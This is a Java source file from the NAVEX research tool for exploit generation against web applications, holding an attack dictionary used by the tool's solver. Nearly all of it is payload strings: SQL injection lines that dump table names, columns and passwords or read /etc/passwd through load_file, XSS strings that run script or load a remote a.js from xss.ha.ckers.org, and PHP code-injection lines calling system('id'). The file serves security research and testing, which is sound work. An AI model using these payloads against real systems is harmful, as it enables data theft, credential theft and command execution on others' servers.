
/**
 * @author Abeer Alhuzali
 * Attack Strings in the Attack Dictionary
 * For more information, please read "NAVEX: Precise and Scalable Exploit Generation for Dynamic Web Applications"
 *
 */
package navex.solver;
 

 
 
public class AttackStrings {
 
     
    public final static String[] SQL_ATTACK_STRINGS_SINGLE_QUOTES = {
            "1' OR ''='",
             "1\' AND non_existant_table = \'1 --",
              "1' OR \'1\'=\'1--",
              "1\' OR 1=1--",
               "1' UNION SELECT 1, version() limit 1,1 AND \'1\' = \'1",
              "1\' and 1=1 union select null,table_name,null from information_schema.tables limit 28,1-- -",
                "1\' and 1=1 union select null,column_name,null from information_schema.columns where table_name=\'foundtablename\' LIMIT 0,1-- -",
                "1\' and 1=1 union select null,password,null from users limit 1,1-- -",
                "(1)and(1)=(1)union(select(null),table_name,(null)from(information_schema.tables)limit 28,1-- -)",
                "-1/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32/*",
                "(0)' union(select(0),group_concat(table_name),(0)from(information_schema.tables))#",
                "(0)' union(select(0),group_concat(column_name),(0)from(information_schema.columns))#",
                "(0)' union(select(0),group_concat(schema_name),(0)from(information_schema.schemata))#",
                "(0)' union(select(0),database(),(0))#",
                "(0)' union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x74657374)))#",
                "(0)' union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x74657374)&&(table_name)!=(0x7573657273)))#",
                "(0)' union(select(table_name),column_name,(0)from(information_schema.columns)having((table_name)like(0x7573657273)))#",
                "(0)' union(select(table_name),column_name,(0)from(information_schema.columns)having((table_name)like(0x7573657273)&&(column_name)!=(0x6964)))#"
                 
               
      };
    public final static String[] SQL_ATTACK_STRINGS_DOUBLE_QUOTES = {
            "1\\\" OR \\\"\\\"=\\\"",
             "1\\\" AND non_existant_table = \\\"1 --",
              "1\\\" OR \\\"1\\\"=\\\"1--",
               "1\\\" UNION SELECT 1, version() limit 1,1 AND \\\"1\\\" = \\\"1",
              "1\\\" and 1=1 union select null,table_name,null from information_schema.tables limit 28,1-- -",
                "1\\\" and 1=1 union select null,column_name,null from information_schema.columns where table_name=\\\"foundtablename\\\" LIMIT 0,1-- -",
                "1\\\" and 1=1 union select null,password,null from users limit 1,1-- -",
                "-1\\\"/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32/*",
                "(0)\\\" union(select(0),group_concat(table_name),(0)from(information_schema.tables))#",
                "(0)\\\" union(select(0),group_concat(column_name),(0)from(information_schema.columns))#",
                "(0)\\\" union(select(0),group_concat(schema_name),(0)from(information_schema.schemata))#",
                "(0)\\\" union(select(0),database(),(0))#",
                "(0)\\\" union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x74657374)))#",
                "(0)\\\" union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x74657374)&&(table_name)!=(0x7573657273)))#",
                "(0)\\\" union(select(table_name),column_name,(0)from(information_schema.columns)having((table_name)like(0x7573657273)))#",
                "(0)\\\" union(select(table_name),column_name,(0)from(information_schema.columns)having((table_name)like(0x7573657273)&&(column_name)!=(0x6964)))#"
               
      };
    public final static String[] SQL_ATTACK_STRINGS_NO_QUOTES = {
                    "1 OR 1=1",
                    "1 OR 1=1--",
                    "1 OR 1=1 LIMIT x,1-- -",
                    "1 and 1=1 union select null,table_name,null from information_schema.tables limit 28,1-- -",
                    "1 and 1=0 union select null,column_name,null from information_schema.columns where table_name=\'foundtablename\' LIMIT 0,1-- -",
                    "1 and 1=0 union select null,password,null from users limit 1,1-- -",
                    "(1)and(1)=(0)union(select(null),table_name,(null)from(information_schema.tables)limit 28,1-- -)",
                    "-1/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32/*",
                  
                    "(0)union(select(0),group_concat(table_name),(0)from(information_schema.tables))#",
                    "(0)union(select(0),group_concat(column_name),(0)from(information_schema.columns))#",
                    "(0)union(select(0),group_concat(schema_name),(0)from(information_schema.schemata))#",
                    "(0)union(select(0),database(),(0))#",
                    "(0)union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x74657374)))#",
                    "(0)union(select(table_schema),table_name,(0)from(information_schema.tables)having((table_schema)like(0x74657374)&&(table_name)!=(0x7573657273)))#",
                    "(0)union(select(table_name),column_name,(0)from(information_schema.columns)having((table_name)like(0x7573657273)))#",
                    "(0)union(select(table_name),column_name,(0)from(information_schema.columns)having((table_name)like(0x7573657273)&&(column_name)!=(0x6964)))#",
                    "(coalesce(length(load_file(0x2F6574632F706173737764)),1))",
                    "(case(mid(load_file(0x2F6574632F706173737764),$x,1))when($char)then(1)else(0)end)",
                    "1&& 1=1;%00",
                    "chr(0xbf) chr(0x27) OR 1 = 1 /*"
      };
public final static String[] XSS_ATTACK_STRINGS_SINGLE_QUOTES = {
        "<SCRIPT>alert(1)</SCRIPT>",                 
        "javascript:alert(1)",
          "JaVaScRiPt:alert(1)",
          "JaVaScRiPt:alert(&quot;XSS&quot;)",
          "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41",
          "&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041",
          "&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29",
          "jav&#x09;ascript:alert(1);",
          "jav&#x0A;ascript:alert(1);",
          "jav&#x0D;ascript:alert(1);",
          "' ONLOAD='alert(1)",
          "' <SCRIPT a=\\\'>\\\' SRC=\\\'http://xss.ha.ckers.org/a.js\\\'></SCRIPT>",
          "' <SCRIPT =\\\'>\\\' SRC=\\\'http://xss.ha.ckers.org/a.js\\\'></SCRIPT>",
          "' <SCRIPT a=\\\'>\\\' \'\' SRC=\\\'http://xss.ha.ckers.org/a.js\\\'></SCRIPT>",
          "' <SCRIPT \\\'a=\'>\'\\\' SRC=\\\'http://xss.ha.ckers.org/a.js\\\'></SCRIPT>",
          "' <SCRIPT>document.write(\\\'<SCRI\\\');</SCRIPT>PT SRC=\\\'http://xss.ha.ckers.org/a.js\\\'></SCRIPT>",
             "%26%2339%3B-alert(1)-%26%2339%3B",
             "' onmouseover='alert(1)"
    };
public final static String[] XSS_ATTACK_STRINGS_DOUBLE_QUOTES = {
        "<SCRIPT>alert(1)</SCRIPT>",            
        "javascript:alert(1)",
                  "JaVaScRiPt:alert(1)",
                  "JaVaScRiPt:alert(&quot;XSS&quot;)",
                  "\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41\"",
                  "\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\"",
                  "\"&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29\"",
                  "jav&#x09;ascript:alert(1);",
                  "jav&#x0A;ascript:alert(1);",
                  "jav&#x0D;ascript:alert(1);", 
                  "\" ONLOAD=\"alert(1)",
                  "\" <SCRIPT a=\\\">\\\" SRC=\\\"http://xss.ha.ckers.org/a.js\\\"></SCRIPT>",
                  "\" <SCRIPT =\\\">\\\" SRC=\\\"http://xss.ha.ckers.org/a.js\\\"></SCRIPT>",
                  "\" <SCRIPT a=\\\">\\\" \'\' SRC=\\\"http://xss.ha.ckers.org/a.js\\\"></SCRIPT>",
                  "\" <SCRIPT \\\"a=\'>\'\\\" SRC=\\\"http://xss.ha.ckers.org/a.js\\\"></SCRIPT>",
                  "\" <SCRIPT>document.write(\\\"<SCRI\\\");</SCRIPT>PT SRC=\\\"http://xss.ha.ckers.org/a.js\\\"></SCRIPT>",
                    "\" onmouseover=\"alert(1)"
                    
            };
public final static String[] XSS_ATTACK_STRINGS_NO_QUOTES = {
        "<SCRIPT>alert(1)</SCRIPT>",                 
        "javascript:alert(1)",
          "JaVaScRiPt:alert(1)",
          "JaVaScRiPt:alert(&quot;XSS&quot;)",
          "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41",
          "&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041",
          "&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29",
          "jav&#x09;ascript:alert(1);",
          "jav&#x0A;ascript:alert(1);",
          "jav&#x0D;ascript:alert(1);",
          " ONLOAD=alert(1)",
          "-alert(1)"
};
/*public final static String[] CODE_ATTACK_STRINGS_SINGLE_QUOTES = {
         
};
public final static String[] CODE_ATTACK_STRINGS_DOUBLE_QUOTES = {
             
    };
    */
public final static String[] CODE_ATTACK_STRINGS_NO_QUOTES = {
        "1; phpinfo()",
        "1; system('id')",
        "1; system('echo /etc/passwd')",
        "1; ls"
};
 //To be added 
public final static String[] COMMAND_ATTACK_STRINGS_NO_QUOTES = {
     
    };
//To be added
public final static String[] FILE_ATTACK_STRINGS_NO_QUOTES = {
             
    };

public static String[] getAttackStrinsList(String nameOfList) {
	switch (nameOfList){
	case "COMMAND_ATTACK_STRINGS_NO_QUOTES": 
		return AttackStrings.COMMAND_ATTACK_STRINGS_NO_QUOTES;
		
	case "CODE_ATTACK_STRINGS_NO_QUOTES": 
		return AttackStrings.CODE_ATTACK_STRINGS_NO_QUOTES;
	case "FILE_ATTACK_STRINGS_NO_QUOTES": 
		return AttackStrings.FILE_ATTACK_STRINGS_NO_QUOTES;
	case "SQL_ATTACK_STRINGS_NO_QUOTES": 
		return AttackStrings.SQL_ATTACK_STRINGS_NO_QUOTES;
	case "SQL_ATTACK_STRINGS_DOUBLE_QUOTES": 
		return AttackStrings.SQL_ATTACK_STRINGS_DOUBLE_QUOTES;
	case "SQL_ATTACK_STRINGS_SINGLE_QUOTES": 
		return AttackStrings.SQL_ATTACK_STRINGS_SINGLE_QUOTES;
	case "XSS_ATTACK_STRINGS_NO_QUOTES": 
		return AttackStrings.XSS_ATTACK_STRINGS_NO_QUOTES;
	case "XSS_ATTACK_STRINGS_DOUBLE_QUOTES":
		return AttackStrings.XSS_ATTACK_STRINGS_DOUBLE_QUOTES;
	case "XSS_ATTACK_STRINGS_SINGLE_QUOTES": 
		return AttackStrings.XSS_ATTACK_STRINGS_SINGLE_QUOTES;
		default: 
			return null;
	}
	
}



}